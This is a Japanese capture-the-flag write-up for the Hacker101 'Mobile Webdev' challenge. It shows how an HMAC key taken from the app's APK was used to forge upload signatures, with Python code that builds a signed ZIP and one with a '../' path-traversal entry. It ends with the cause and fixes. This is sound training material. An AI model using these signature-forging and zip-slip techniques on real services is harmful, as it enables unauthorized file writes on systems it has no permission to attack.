# Mobile Webdev — 解法

2026-11-02 にHacker101 CTFで2つのフラグを提出し、一覧の **2/2** と全体 **260点** を確認した。インスタンス固有のホスト名とフラグは公開しない。

## 調査

配布ページから `webdev.apk` を取得し、APK内の `classes.dex` を調べた。アプリはWebViewで `/content/` と `/edit.php` を開き、`HmacKey` に16進文字列を保持している。編集画面のHTMLコメントには、通常は表示されない `/upload.php` へのリンクがあった。アップロード画面はZIPを受け付ける。

参考にした[公開writeup](https://github.com/l0lsec/hacker101-ctf-writeups/blob/main/webdev/README.md)を手掛かりに、APK中の鍵、実際のフォーム、アップロード応答をこの演習インスタンスで確認した。

## 1つ目：署名付きZIP

無害なテキストファイルを1つ入れた小さなZIPを作る。APK内の `HmacKey` は16進数からバイト列に変換し、ZIP全体のバイト列に対してHMAC-MD5を計算する。署名は32桁の16進数になる。

```python
import hashlib
import hmac
import zipfile

with zipfile.ZipFile("test.zip", "w") as archive:
    archive.writestr("hello.txt", "Hacker101 upload test")

key = bytes.fromhex("APKから読み取ったHmacKeyの16進文字列")
with open("test.zip", "rb") as file:
    signature = hmac.new(key, file.read(), hashlib.md5).hexdigest()
print(signature)
```

`POST /upload.php` のmultipart欄 `file` にZIP、`hmac` に署名を指定する。正しい署名の応答には1つ目のフラグと `Extracted to temp folder. TODO: Copy to content directory.` が表示された。フラグを提出し、成功表示を確認した。

## 2つ目：ZIP内の相対パス

ZIPのファイル名に `../codex-proof.txt` を入れて、同じ手順で新しいZIP全体を署名する。これは展開先から一段上を指すパスで、既存の `index.html` を上書きしない検証用の名前を選んだ。

```python
with zipfile.ZipFile("traversal.zip", "w") as archive:
    archive.writestr("../codex-proof.txt", "Hacker101 ZIP path test")
```

署名付きで `/upload.php` に送ると、応答に `Path traversal:` と2つ目のフラグが表示された。提出後、CTF一覧で **Mobile Webdev 2/2** を確認した。サーバー上に検証ファイルが実際に作られたか、配置先は確認していない。

## 原因と対策

APK内の共通鍵を知れば誰でも正しいHMACを作れる。さらにZIP内のパスに `../` が含まれても受け付けるため、展開先から外れるパスを指定できる。対策は、クライアントに共通秘密鍵を埋め込まないことと、展開前に各エントリの正規化後のパスが許可されたディレクトリ内にあるか検査すること。
